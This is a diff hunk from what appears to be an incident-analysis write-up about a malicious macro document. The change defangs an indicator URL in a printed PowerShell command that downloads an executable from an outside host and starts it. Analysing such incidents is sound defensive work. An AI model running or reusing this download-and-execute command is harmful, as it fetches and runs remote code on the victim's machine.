@@ -53,7 +53,7 @@ A document named ***edit-invoice.docm.zip*** was downloaded by the host. This do
 <b><h4>8:42</h4></b>
 Once the document was opened the malicious macro executed a remoted Powershell Command which appears to go to Greyhacker.net to download a file. The subsequent log entry returns a HTTP 404 response code which means it could not find the file. The full command is below:
 
-<h2> (New-Object System.Net.WebClient).DownloadFile('http[:]//www.greyhathacker[.]net/tools/messbox.exe','mess.exe');Start-Process 'mess.exe' </h2>
+<h2> (New-Object System.Net.WebClient).DownloadFile('hxxp://www[.]greyhathacker[.]net/tools/messbox[.]exe','mess.exe'); Start-Process 'mess.exe' </h2>
 
 <img width="1493" height="889" alt="Remote Command Executed" src="https://github.com/user-attachments/assets/fcc50ab8-c988-4e31-bdf8-69c09a0c4b29" />
 
